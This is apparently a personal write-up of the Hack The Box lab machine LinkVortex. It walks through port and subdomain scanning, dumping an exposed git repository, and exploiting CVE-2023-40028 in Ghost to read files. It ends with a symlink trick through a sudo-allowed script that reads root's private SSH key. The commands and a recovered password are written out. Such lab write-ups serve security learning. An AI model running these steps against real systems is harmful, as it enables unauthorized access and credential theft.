---
date: 2025-03-02
categories: [Linux, Easy]
---

![LinkVortexBusqueda](https://labs.hackthebox.com/storage/avatars/97f12db8fafed028448e29e30be7efac.png)

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [0xyassine](https://app.hackthebox.com/users/143843)        | [Hack The Box](https://www.hackthebox.com/)     | Easy           | Linux   |

---










- I start with a scan of the open ports and I continue with a scan of the versions and technologies that are running on the open ports that we have found
	
	```python
	nmap -p- --open --min-rate 5000 -Pn -sS 10.10.11.47 -oG scan
	nmap -p22,80 -sCV -Pn 10.10.11.47 -oN ports
	```

	![image](https://github.com/user-attachments/assets/6b9a5ab6-bc5a-4ac4-ab30-136388ba3e47)

- I go to the site and see that a de-tialized version of Ghost is running. I find that it has a vulnerability, [CVE-2023-40028](https://github.com/TryGhost/Ghost/security/advisories/GHSA-9c9v-w225-v5rg). I need to find a valid credential to be able to abuse this vulnerability.
	
	![image](https://github.com/user-attachments/assets/ca1b0990-862f-4762-8508-55ff86aaa5c3)

- I do a search for subdomains and I find one.

	```python
	wfuzz -c -t 100  --hh=230 -w  /usr/share/amass/wordlists/subdomains-top1mil-110000.txt -H "Host: FUZZ.linkvortex.htb" http://linkvortex.htb
	```

	![image](https://github.com/user-attachments/assets/c20f6bcb-f380-4028-9676-de65dc0a490d)

  ![image](https://github.com/user-attachments/assets/ace1c268-9d0b-4fd7-821d-7721886df1fd)

- When listing the found subdomain I find a git repository. I download it with [git-dumper](https://github.com/arthaud/git-dumper)

	```python
	git-dumper "http://dev.linkvortex.htb/.git"  /home/rufo/linkVortex/content/example 
	```

- I search in the repository files and find some passwords. I try with the passwords I found and the vulnerability I found before and I manage to find some valid credentials.
	
	```python
	./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
	```

- I modify the script to point to the endpoint and I manage to read internal files of the machine. LFI

	![image](https://github.com/user-attachments/assets/3a94aebf-ce76-4653-b658-7f5317d1379d)

	![image](https://github.com/user-attachments/assets/5079c283-ce1c-4373-b80e-618790f7f33e)

- I list the repository files and manage to find some credentials in the production environment configuration file

	![image](https://github.com/user-attachments/assets/96b51d9a-cfa4-46b3-9a62-2b46cb9948a2)

- Thanks to these credentials I am able to log in via ssh and read the first flag

  	![image](https://github.com/user-attachments/assets/d966b202-6bdf-4257-a4b8-f0b5f007d612)

- Listing the system files, I see that I can execute as root the file clean_symlink.sh and passing any file as argument.
- I create a couple of symbolic links to be able to read the file with the ssh key of the root user.

	![image](https://github.com/user-attachments/assets/60f2cdd4-b05b-4c56-871f-883bbc70ca4e)

	```python
	ln -s /root/.ssh/id_rsa link1.txt
	ln -s /tmp/a/link1.txt duo.png
	sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/a/duo.png
	```

	![image](https://github.com/user-attachments/assets/809e4ed4-9443-4c30-8784-2589ab5f2fd3)

- With this key I connect via ssh as root and manage to read the second flag

	![image](https://github.com/user-attachments/assets/546c5283-90cc-461d-94fb-8248f0630f3b)
